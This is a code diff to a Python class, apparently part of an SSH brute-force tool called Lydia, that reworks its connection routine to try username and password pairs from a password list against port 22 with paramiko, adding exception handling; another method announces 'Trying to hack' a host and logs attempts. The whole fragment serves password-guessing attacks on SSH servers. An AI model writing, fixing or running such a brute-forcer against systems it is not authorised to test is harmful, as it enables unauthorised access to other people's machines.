@@ -12,16 +12,20 @@ class Lydia:
         self.logfilepath = logfilepath
         self.passlistpath = passlistpath
     def tryConnect(self, host, n, p):
-        client = paramiko.client.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            client.connect(host, username=n, password=p, banner_timeout=2)
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, 22, n, p)
+            client.close()
             return True
-        except:
-            try:
-                return False
-            except:
-                return False
+        except paramiko.AuthenticationException:
+            return False
+        except paramiko.SSHException as e:
+            print(f"SSH error: {str(e)}")
+            return False
+        except Exception as e:
+            print(f"Error: {str(e)}")
+            return False
     def hack(self):
         print("[" + colored("Thread " + self.threadnr, "red") + "][" + colored("INFO", "cyan") + "] Trying to hack " + colored(self.host, "magenta") + " now...")
         logfile = open(self.logfilepath, "a", encoding = 'utf-8', errors = 'ignore')
